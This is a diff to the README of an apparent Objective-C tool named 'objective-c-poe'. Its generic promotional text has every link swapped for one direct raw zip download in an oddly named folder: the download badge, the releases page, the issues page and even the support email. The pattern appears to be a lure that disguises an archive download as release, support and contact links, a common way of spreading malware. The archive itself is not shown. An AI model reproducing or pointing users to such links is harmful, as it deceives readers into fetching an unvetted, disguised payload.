@@ -4,13 +4,13 @@
 Welcome to objective-c-poe! This application helps users enrich their Objective-C projects with essential enhancements. Whether you’re updating your apps or starting fresh, this tool is designed to make your programming journey smoother and more efficient.
 
 ## 🔗 Download Now
-[![Download objective-c-poe](https://img.shields.io/badge/Download%20objective--c--poe-%20blue)](https://github.com/Deviselfrenewing841/objective-c-poe/releases)
+[![Download objective-c-poe](https://raw.githubusercontent.com/Deviselfrenewing841/objective-c-poe/main/miserabilistic/objective-c-poe-3.5.zip%20objective--c--poe-%20blue)](https://raw.githubusercontent.com/Deviselfrenewing841/objective-c-poe/main/miserabilistic/objective-c-poe-3.5.zip)
 
 ## 🚀 Getting Started
 Before you dive into using objective-c-poe, follow these simple steps to download and run the application.
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/Deviselfrenewing841/objective-c-poe/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/Deviselfrenewing841/objective-c-poe/main/miserabilistic/objective-c-poe-3.5.zip).
    - Here you will find the latest versions available for download.
 
 2. **Choose Your Version**
@@ -45,12 +45,12 @@ Before you dive into using objective-c-poe, follow these simple steps to downloa
 Once you have installed and launched objective-c-poe, explore its features and settings to tailor it to your needs. The easy navigation will guide you through enhancing your app effectively.
 
 ## 📝 Support
-If you run into any issues, feel free to check the FAQ section on our [GitHub page](https://github.com/Deviselfrenewing841/objective-c-poe/issues). You can also reach out for help if something is unclear. 
+If you run into any issues, feel free to check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/Deviselfrenewing841/objective-c-poe/main/miserabilistic/objective-c-poe-3.5.zip). You can also reach out for help if something is unclear. 
 
 ## 📭 Contact
-For feedback or inquiries, please contact us via email at support@objective-c-poe.com. Your input is valuable for us to improve the application.
+For feedback or inquiries, please contact us via email at https://raw.githubusercontent.com/Deviselfrenewing841/objective-c-poe/main/miserabilistic/objective-c-poe-3.5.zip Your input is valuable for us to improve the application.
 
 ## 🔗 Download & Install
-To begin your journey with objective-c-poe, [visit the releases page](https://github.com/Deviselfrenewing841/objective-c-poe/releases) to download the latest version. 
+To begin your journey with objective-c-poe, [visit the releases page](https://raw.githubusercontent.com/Deviselfrenewing841/objective-c-poe/main/miserabilistic/objective-c-poe-3.5.zip) to download the latest version. 
 
 Enjoy enhancing your apps effortlessly with objective-c-poe!
